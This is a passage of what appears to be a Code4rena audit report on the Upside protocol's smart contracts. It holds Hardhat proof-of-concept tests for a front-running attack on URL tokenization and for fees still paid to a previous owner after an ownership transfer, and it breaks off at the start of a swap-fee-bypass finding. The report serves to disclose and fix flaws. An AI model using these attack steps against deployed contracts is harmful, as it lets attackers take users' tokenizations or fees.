<p>Require users to first commit to a hash of the URL, and then reveal the full URL in a second transaction after a short delay. This prevents front-runners from knowing what is being tokenized in the first transaction.</p>
<h3 style="position:relative;" id="proof-of-concept"><a class="anchor before" aria-label="proof of concept permalink" href="https://code4rena.com/reports/2025-05-upside#proof-of-concept"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In PoC.test.ts, make the following modification:</li>
</ol>
<pre data-index="2" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // Add this import</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in the same file:</li>
</ol>
<pre data-index="3" data-language="typescript" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span><span class="mtk11">it</span><span class="mtk1">(</span><span class="mtk8">"Should permit user2 to execute transactions ahead of user1"</span><span class="mtk1">, </span><span class="mtk4">async</span><span class="mtk1"> </span><span class="mtk4">function</span><span class="mtk1"> () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">url1</span><span class="mtk1"> = </span><span class="mtk8">"https://example1.com"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">liquidityToken</span><span class="mtk1">.</span><span class="mtk11">getAddress</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">owner</span><span class="mtk1">.</span><span class="mtk11">getAddress</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Fee configuration</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">newFeeInfo</span><span class="mtk1"> = {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">tokenizeFeeEnabled:</span><span class="mtk1"> </span><span class="mtk4">true</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">tokenizeFeeDestinationAddress:</span><span class="mtk1"> </span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeStartingBp:</span><span class="mtk1"> </span><span class="mtk7">9900</span><span class="mtk1">,  </span><span class="mtk3">// 99%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDecayBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,      </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDecayInterval:</span><span class="mtk1"> </span><span class="mtk7">6</span><span class="mtk1">,  </span><span class="mtk3">// 6 seconds</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeFinalBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,      </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeDeployerBp:</span><span class="mtk1"> </span><span class="mtk7">1000</span><span class="mtk1">,  </span><span class="mtk3">// 10%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">swapFeeSellBp:</span><span class="mtk1"> </span><span class="mtk7">100</span><span class="mtk1">,       </span><span class="mtk3">// 1%</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    };</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Set fee info</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">owner</span><span class="mtk1">).</span><span class="mtk11">setFeeInfo</span><span class="mtk1">(</span><span class="mtk12">newFeeInfo</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Turn off auto-mining to simulate pending transactions in the mempool</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_setAutomine"</span><span class="mtk1">, [</span><span class="mtk4">false</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// User1 submits a transaction with normal gas fees</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">user1Tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user1</span><span class="mtk1">).</span><span class="mtk11">tokenize</span><span class="mtk1">(</span><span class="mtk12">url1</span><span class="mtk1">, </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1">, {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">gasPrice:</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">"10"</span><span class="mtk1">, </span><span class="mtk8">"gwei"</span><span class="mtk1">), </span><span class="mtk3">// Low priority</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// User2 submits the same transcation with higher gas price to front-run</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">const</span><span class="mtk1"> </span><span class="mtk12">user2Tx</span><span class="mtk1"> = </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">upsideProtocol</span><span class="mtk1">.</span><span class="mtk11">connect</span><span class="mtk1">(</span><span class="mtk12">user2</span><span class="mtk1">).</span><span class="mtk11">tokenize</span><span class="mtk1">(</span><span class="mtk12">url1</span><span class="mtk1">, </span><span class="mtk12">liquidityTokenAddress</span><span class="mtk1">, {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">      </span><span class="mtk12">gasPrice:</span><span class="mtk1"> </span><span class="mtk12">ethers</span><span class="mtk1">.</span><span class="mtk11">parseUnits</span><span class="mtk1">(</span><span class="mtk8">"100"</span><span class="mtk1">, </span><span class="mtk8">"gwei"</span><span class="mtk1">), </span><span class="mtk3">// High priority</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Mine the transactions, user2's should be prioritized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_mine"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Reactivate auto-mining for normal operation</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk12">network</span><span class="mtk1">.</span><span class="mtk12">provider</span><span class="mtk1">.</span><span class="mtk11">send</span><span class="mtk1">(</span><span class="mtk8">"evm_setAutomine"</span><span class="mtk1">, [</span><span class="mtk4">true</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Verify that user1's transaction failed because the URL was already tokenized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">await</span><span class="mtk1"> </span><span class="mtk11">expect</span><span class="mtk1">(</span><span class="mtk12">user1Tx</span><span class="mtk1">.</span><span class="mtk11">wait</span><span class="mtk1">()).</span><span class="mtk12">to</span><span class="mtk1">.</span><span class="mtk12">be</span><span class="mtk1">.</span><span class="mtk11">revertedWithCustomError</span><span class="mtk1">(</span><span class="mtk12">upsideProtocol</span><span class="mtk1">, </span><span class="mtk8">"MetaCoinExists"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">  }).</span><span class="mtk11">timeout</span><span class="mtk1">(</span><span class="mtk7">100000000</span><span class="mtk1">);</span></span></span></code></pre>
<h2 style="position:relative;" id="02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner"><a class="anchor before" aria-label="02 transferring ownership may result in fees being unintentionally paid to the previous owner permalink" href="https://code4rena.com/reports/2025-05-upside#02-transferring-ownership-may-result-in-fees-being-unintentionally-paid-to-the-previous-owner"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[02] Transferring ownership may result in fees being unintentionally paid to the previous owner</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L337-L353</a></p>
<h3 style="position:relative;" id="finding-description-and-impact"><a class="anchor before" aria-label="finding description and impact permalink" href="https://code4rena.com/reports/2025-05-upside#finding-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In the protocol, the <code>tokenizeFeeDestinationAddress</code> is a configurable parameter that determines where tokenization fees are sent when the fee system is enabled. This address is set by the <code>owner</code> of the contract using a function <code>setFeeInfo</code>.</p>
<pre data-index="4" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setFeeInfo</span><span class="mtk1">(</span><span class="mtk12">FeeInfo</span><span class="mtk1"> </span><span class="mtk12">calldata</span><span class="mtk1"> </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">onlyOwner</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">if</span><span class="mtk1"> ( </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDeployerBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDecayBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeFinalBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> || </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeStartingBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeSellBp</span><span class="mtk1"> &gt; </span><span class="mtk7">10000</span><span class="mtk1"> ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">&gt;&gt;          </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">tokenizeFeeDestinationAddress</span><span class="mtk1"> == </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">) ||</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeStartingBp</span><span class="mtk1"> &lt; </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeFinalBp</span><span class="mtk1"> || </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">.</span><span class="mtk12">swapFeeDecayInterval</span><span class="mtk1"> == </span><span class="mtk7">0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">revert</span><span class="mtk1"> </span><span class="mtk11">InvalidSetting</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">feeInfo</span><span class="mtk1"> = </span><span class="mtk12">_newFeeInfo</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">FeeInfoSet</span><span class="mtk1">(</span><span class="mtk12">_newFeeInfo</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>However, when ownership of the contract is transferred using the standard <code>Ownable</code> pattern (e.g., via <code>transferOwnership()</code>), the <code>tokenizeFeeDestinationAddress</code> does not automatically update to reflect the new owner. As a result, all tokenization fees continue being sent to the previous owner, even though they no longer control the contract. This creates a temporal vulnerability between the point of ownership transfer and the point at which the new owner explicitly updates the fee configuration. If the new owner delays or forgets to call <code>setFeeInfo</code>, then fees are still sent to the previous owner.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-1"><a class="anchor before" aria-label="recommended mitigation steps 1 permalink" href="https://code4rena.com/reports/2025-05-upside#recommended-mitigation-steps-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Override the <code>transferOwnership()</code> from <code>Ownable</code> to check that if the current fee recipient is the owner trying to exit, then it should revert.</p>
<h3 style="position:relative;" id="proof-of-concept-1"><a class="anchor before" aria-label="proof of concept 1 permalink" href="https://code4rena.com/reports/2025-05-upside#proof-of-concept-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of concept</h3>
<ol>
<li>In <code>PoC.test.ts</code>, make the following modification:</li>
</ol>
<pre data-index="5" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import { ethers as hhethers } from "hardhat";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    import {IERC20Metadata, UpsideMetaCoin, UpsideProtocol, UpsideStakingStub} from "../types";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+   import { expect } from "chai";</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    describe("C4 PoC Test Suite", function () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        let user1: HardhatEthersSigner;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       let user2: HardhatEthersSigner;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        before(async function () {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            signers = await hhethers.getSigners();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            owner = signers[2];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            user1 = signers[0];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+           user2 = signers[1];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            ---snip---</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        });</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+       // the test below goes here</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    });</span></span></span></code></pre>
<ol start="2">
<li>Add the following test in the same file:</li>
</ol>
<pre data-index="6" data-language="" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source">  it("should send fees to original owner", async function () {</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const url1 = "https://openzeppelin.com";</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const url2 = "https://cantina.com";</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const liquidityTokenAddress = await liquidityToken.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const tokenizeFeeDestinationAddress = await owner.getAddress();</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _mintAmount = hhethers.parseUnits("100", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const _feeAmount = hhethers.parseUnits("5", 6);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Configure fee parameters with current owner as the fee destination</span></span>
<span class="grvsc-line"><span class="grvsc-source">    const newFeeInfo = {</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeEnabled: true,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      tokenizeFeeDestinationAddress: tokenizeFeeDestinationAddress,</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeStartingBp: 9900,  // 99%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDecayInterval: 6,  // 6 seconds</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeFinalBp: 100,      // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeDeployerBp: 1000,  // 10%</span></span>
<span class="grvsc-line"><span class="grvsc-source">      swapFeeSellBp: 100,       // 1%</span></span>
<span class="grvsc-line"><span class="grvsc-source">    };</span></span>
<span class="grvsc-line"><span class="grvsc-source">  </span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Owner sets the fee configuration</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setFeeInfo(newFeeInfo);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // set tokenize fee to 5e6</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).setTokenizeFee(liquidityTokenAddress, _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // mint liquidityToken to user1</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.mint(await user1.getAddress(), _mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that user1 received the minted tokens</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let user1LiquidityTokenBalance = await liquidityToken.balanceOf(await user1.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(user1LiquidityTokenBalance).to.be.eq(_mintAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // user1 performs tokenization (url1), fee should go to current fee destination (owner)</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).tokenize(url1, liquidityTokenAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Validate that the fee was received by the original owner</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let tokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(tokenizeFeeDestinationAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(tokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits("5", 6));</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // Transfer ownership to user2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(owner).transferOwnership(await user2.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    // asset that new ownership is assigned to user2</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(await upsideProtocol.owner()).to.be.eq(await user2.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // user1 performs a second tokenization (url2) after ownership transfer</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await liquidityToken.connect(user1).approve(await upsideProtocol.getAddress(), _feeAmount);</span></span>
<span class="grvsc-line"><span class="grvsc-source">    await upsideProtocol.connect(user1).tokenize(url2, liquidityTokenAddress);</span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source">    // assert that the original owner still receives the fee post-ownership transfer</span></span>
<span class="grvsc-line"><span class="grvsc-source">    let currentTokenizeFeeDestinationAddressBalance = await liquidityToken.balanceOf(await owner.getAddress());</span></span>
<span class="grvsc-line"><span class="grvsc-source">    expect(currentTokenizeFeeDestinationAddressBalance).to.be.eq(hhethers.parseUnits("10", 6));</span></span>
<span class="grvsc-line"><span class="grvsc-source">  });</span></span></code></pre>
<h2 style="position:relative;" id="03-swap-fee-bypass-via-small-trade-amounts"><a class="anchor before" aria-label="03 swap fee bypass via small trade amounts permalink" href="https://code4rena.com/reports/2025-05-upside#03-swap-fee-bypass-via-small-trade-amounts"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>[03] Swap fee bypass via small trade amounts</h2>
<p><a href="https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229">https://github.com/code-423n4/2025-05-upside/blob/9b733293823beebe0cc6813dcfb7bbbb2454d60a/contracts/UpsideProtocol.sol#L198-L229</a></p>
<h3 style="position:relative;" id="finding-description-1"><a class="anchor before" aria-label="finding description 1 permalink" href="https://code4rena.com/reports/2025-05-upside#finding-description-1"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
